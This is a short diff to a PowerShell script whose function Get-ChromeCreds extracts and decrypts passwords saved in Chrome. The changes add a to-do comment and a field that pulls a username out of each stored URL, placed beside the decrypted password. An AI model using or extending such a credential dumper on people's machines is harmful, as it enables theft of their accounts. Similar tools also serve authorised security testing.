@@ -4,6 +4,8 @@
 # Fixes:	Chrome Credential extraction fixed and cookie extraction deleted (buggy)
 # Date:		04/2018
 
+# ToDo:		three arrays output && only username
+
 
 function Get-ChromeCreds() {
 	Param(
@@ -79,6 +81,7 @@ function Get-ChromeCreds() {
 		$ObjectProp = @{
 			UserURL = $UserArray[$i]
 			Password = $DecPwdArray[$i]
+			User = $UserArray[$i].split("/")[-1]
 		}
 	
 		$obj = New-Object PSObject -Property $ObjectProp
